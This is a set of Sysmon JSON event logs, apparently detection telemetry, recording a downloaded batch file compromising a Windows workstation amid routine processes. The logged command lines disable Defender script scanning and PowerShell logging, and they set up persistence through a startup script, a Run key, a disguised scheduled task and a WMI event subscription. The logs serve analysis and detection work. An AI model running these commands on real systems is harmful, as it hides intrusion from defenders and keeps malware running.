{"@timestamp":"2026-04-22T03:14:14.700000Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","command_line":"powershell -NoProfile -Command \"Set-MpPreference -DisableScriptScanning $true\"","parent":{"executable":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","name":"install_obf.bat","command_line":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\""}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1015,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -NoProfile -Command \"Set-MpPreference -DisableScriptScanning $true\"","ParentImage":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","ParentCommandLine":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:14.700"}}}
{"@timestamp":"2026-04-22T03:14:15.200000Z","event":{"code":"11","provider":"Microsoft-Windows-Sysmon","action":"File Created","category":["file"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\cmd.exe","name":"cmd.exe"},"file":{"path":"C:\\Users\\jhowell\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemServices.vbs","name":"SystemServices.vbs"},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":11,"record_id":1018,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\cmd.exe","TargetFilename":"C:\\Users\\jhowell\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemServices.vbs","User":"SKYLOOM\\jhowell","UtcTime":"2026-04-22 03:14:15.200"}}}
{"@timestamp":"2026-04-22T03:14:15.600000Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\schtasks.exe","name":"schtasks.exe","command_line":"schtasks /create /tn \"\\Microsoft\\Windows\\WindowsUpdate\\SystemServicesCheck\" /tr \"wscript.exe \\\"C:\\Users\\jhowell\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemServices.vbs\\\"\" /sc onlogon /rl highest /f","parent":{"executable":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","name":"install_obf.bat","command_line":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\""}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1019,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks /create /tn \"\\Microsoft\\Windows\\WindowsUpdate\\SystemServicesCheck\" /tr \"wscript.exe \\\"C:\\Users\\jhowell\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemServices.vbs\\\"\" /sc onlogon /rl highest /f","ParentImage":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","ParentCommandLine":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:15.600"}}}
{"@timestamp":"2026-04-22T03:14:15Z","event":{"code":"13","provider":"Microsoft-Windows-Sysmon","action":"Registry Set","category":["registry"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\reg.exe","name":"reg.exe"},"registry":{"path":"HKU\\S-1-5-21-1004336348-1177238915-682003330-1006\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemServices","data":{"strings":["wscript.exe \"C:\\Users\\jhowell\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemServices.vbs\""]}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":13,"record_id":1017,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\reg.exe","TargetObject":"HKU\\S-1-5-21-1004336348-1177238915-682003330-1006\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemServices","Details":"wscript.exe \"C:\\Users\\jhowell\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemServices.vbs\"","EventType":"SetValue","User":"SKYLOOM\\jhowell","UtcTime":"2026-04-22 03:14:15.000"}}}
{"@timestamp":"2026-04-22T03:14:16.100000Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\wbem\\WMIC.exe","name":"WMIC.exe","command_line":"wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=\"WindowsHealthFilter\", EventNamespace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"","parent":{"executable":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","name":"install_obf.bat","command_line":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\""}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1020,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\wbem\\WMIC.exe","CommandLine":"wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=\"WindowsHealthFilter\", EventNamespace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"","ParentImage":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","ParentCommandLine":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:16.100"}}}
{"@timestamp":"2026-04-22T03:14:16.150000Z","event":{"code":"19","provider":"Microsoft-Windows-Sysmon","action":"WmiEventFilter","category":["process"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":19,"record_id":1021,"computer_name":"eng-bell-04","event_data":{"EventType":"WmiFilterEvent","User":"SKYLOOM\\jhowell","Name":"WindowsHealthFilter","UtcTime":"2026-04-22 03:14:16.150","Query":"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}}}
{"@timestamp":"2026-04-22T03:14:16.382846Z","event":{"code":"13","provider":"Microsoft-Windows-Sysmon","action":"Registry Set","category":["registry"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\explorer.exe","name":"explorer.exe"},"registry":{"path":"HKU\\S-1-5-21-1004336348-1177238915-682003330-1006\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\.pdf\\77","data":{"strings":["design-review-62.pdf"]}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":13,"record_id":2079,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\explorer.exe","TargetObject":"HKU\\S-1-5-21-1004336348-1177238915-682003330-1006\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\.pdf\\77","Details":"design-review-62.pdf","EventType":"SetValue","User":"SKYLOOM\\jhowell","UtcTime":"2026-04-22 03:14:16.382"}}}
{"@timestamp":"2026-04-22T03:14:16.500000Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\wbem\\WMIC.exe","name":"WMIC.exe","command_line":"wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name=\"WindowsHealthMonitor\", CommandLineTemplate=\"wscript.exe \\\"C:\\Users\\jhowell\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemServices.vbs\\\"\"","parent":{"executable":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","name":"install_obf.bat","command_line":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\""}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1022,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\wbem\\WMIC.exe","CommandLine":"wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name=\"WindowsHealthMonitor\", CommandLineTemplate=\"wscript.exe \\\"C:\\Users\\jhowell\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemServices.vbs\\\"\"","ParentImage":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","ParentCommandLine":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:16.500"}}}
{"@timestamp":"2026-04-22T03:14:16.550000Z","event":{"code":"20","provider":"Microsoft-Windows-Sysmon","action":"WmiEventConsumer","category":["process"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":20,"record_id":1023,"computer_name":"eng-bell-04","event_data":{"EventType":"WmiConsumerEvent","User":"SKYLOOM\\jhowell","Name":"WindowsHealthMonitor","UtcTime":"2026-04-22 03:14:16.550"}}}
{"@timestamp":"2026-04-22T03:14:16.900000Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\wbem\\WMIC.exe","name":"WMIC.exe","command_line":"wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"WindowsHealthFilter\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"WindowsHealthMonitor\\\"\"","parent":{"executable":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","name":"install_obf.bat","command_line":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\""}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1024,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\wbem\\WMIC.exe","CommandLine":"wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"WindowsHealthFilter\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"WindowsHealthMonitor\\\"\"","ParentImage":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","ParentCommandLine":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:16.900"}}}
{"@timestamp":"2026-04-22T03:14:16.950000Z","event":{"code":"21","provider":"Microsoft-Windows-Sysmon","action":"WmiEventBinding","category":["process"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":21,"record_id":1025,"computer_name":"eng-bell-04","event_data":{"EventType":"WmiBindingEvent","User":"SKYLOOM\\jhowell","Name":"WindowsHealthFilter -> WindowsHealthMonitor","UtcTime":"2026-04-22 03:14:16.950","Consumer":"WindowsHealthMonitor"}}}
{"@timestamp":"2026-04-22T03:14:17.500000Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","command_line":"powershell -NoProfile -Command \"Set-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Name EnableScriptBlockLogging -Value 0\"","parent":{"executable":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","name":"install_obf.bat","command_line":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\""}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1026,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -NoProfile -Command \"Set-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Name EnableScriptBlockLogging -Value 0\"","ParentImage":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","ParentCommandLine":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:17.500"}}}
{"@timestamp":"2026-04-22T03:14:18Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Users\\jhowell\\AppData\\Local\\Programs\\Python\\Python312\\python.exe","name":"python.exe","command_line":"python.exe \"C:\\Users\\jhowell\\AppData\\Local\\SystemServices\\svc.py\"","parent":{"executable":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","name":"install_obf.bat","command_line":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\""}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1028,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Users\\jhowell\\AppData\\Local\\Programs\\Python\\Python312\\python.exe","CommandLine":"python.exe \"C:\\Users\\jhowell\\AppData\\Local\\SystemServices\\svc.py\"","ParentImage":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","ParentCommandLine":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:18.000"}}}
{"@timestamp":"2026-04-22T03:14:20.819969Z","event":{"code":"13","provider":"Microsoft-Windows-Sysmon","action":"Registry Set","category":["registry"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\explorer.exe","name":"explorer.exe"},"registry":{"path":"HKU\\S-1-5-21-1004336348-1177238915-682003330-1006\\Software\\Microsoft\\Office\\16.0\\Common\\UserInfo\\UserName","data":{"strings":["John Howell"]}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":13,"record_id":2094,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\explorer.exe","TargetObject":"HKU\\S-1-5-21-1004336348-1177238915-682003330-1006\\Software\\Microsoft\\Office\\16.0\\Common\\UserInfo\\UserName","Details":"John Howell","EventType":"SetValue","User":"SKYLOOM\\jhowell","UtcTime":"2026-04-22 03:14:20.819"}}}
{"@timestamp":"2026-04-22T03:14:21.201045Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe","name":"MicrosoftEdgeUpdate.exe","command_line":"\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /ua /installsource scheduler","parent":{"executable":"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe","name":"MicrosoftEdgeUpdate.exe","command_line":"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe"}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1355,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe","CommandLine":"\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /ua /installsource scheduler","ParentImage":"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe","ParentCommandLine":"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:21.201"}}}
{"@timestamp":"2026-04-22T03:14:21.660427Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\conhost.exe","name":"conhost.exe","command_line":"\\??\\C:\\Windows\\System32\\conhost.exe 0xffffffff -ForceV1","parent":{"executable":"C:\\Windows\\System32\\svchost.exe","name":"svchost.exe","command_line":"C:\\Windows\\System32\\svchost.exe"}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1240,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\conhost.exe","CommandLine":"\\??\\C:\\Windows\\System32\\conhost.exe 0xffffffff -ForceV1","ParentImage":"C:\\Windows\\System32\\svchost.exe","ParentCommandLine":"C:\\Windows\\System32\\svchost.exe","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:21.660"}}}
{"@timestamp":"2026-04-22T03:14:23.088445Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe","name":"MicrosoftEdgeUpdate.exe","command_line":"\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /ua /installsource scheduler","parent":{"executable":"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe","name":"MicrosoftEdgeUpdate.exe","command_line":"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe"}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1156,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe","CommandLine":"\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /ua /installsource scheduler","ParentImage":"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe","ParentCommandLine":"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:23.088"}}}
{"@timestamp":"2026-04-22T03:14:30.403321Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Users\\jhowell\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe","name":"Teams.exe","command_line":"\"C:\\Users\\jhowell\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\" --type=renderer --user-data-dir=...","parent":{"executable":"C:\\Windows\\explorer.exe","name":"explorer.exe","command_line":"C:\\Windows\\explorer.exe"}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1232,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Users\\jhowell\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe","CommandLine":"\"C:\\Users\\jhowell\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\" --type=renderer --user-data-dir=...","ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"C:\\Windows\\explorer.exe","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:30.403"}}}
{"@timestamp":"2026-04-22T03:14:32.853770Z","event":{"code":"13","provider":"Microsoft-Windows-Sysmon","action":"Registry Set","category":["registry"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\explorer.exe","name":"explorer.exe"},"registry":{"path":"HKU\\S-1-5-21-1004336348-1177238915-682003330-1006\\Software\\Microsoft\\Office\\16.0\\Common\\UserInfo\\UserName","data":{"strings":["John Howell"]}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":13,"record_id":2070,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\explorer.exe","TargetObject":"HKU\\S-1-5-21-1004336348-1177238915-682003330-1006\\Software\\Microsoft\\Office\\16.0\\Common\\UserInfo\\UserName","Details":"John Howell","EventType":"SetValue","User":"SKYLOOM\\jhowell","UtcTime":"2026-04-22 03:14:32.853"}}}
{"@timestamp":"2026-04-22T03:14:37.092368Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\MoUsoCoreWorker.exe","name":"MoUsoCoreWorker.exe","command_line":"C:\\Windows\\System32\\MoUsoCoreWorker.exe -Embedding","parent":{"executable":"C:\\Windows\\System32\\svchost.exe","name":"svchost.exe","command_line":"C:\\Windows\\System32\\svchost.exe"}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1335,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\MoUsoCoreWorker.exe","CommandLine":"C:\\Windows\\System32\\MoUsoCoreWorker.exe -Embedding","ParentImage":"C:\\Windows\\System32\\svchost.exe","ParentCommandLine":"C:\\Windows\\System32\\svchost.exe","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:37.092"}}}
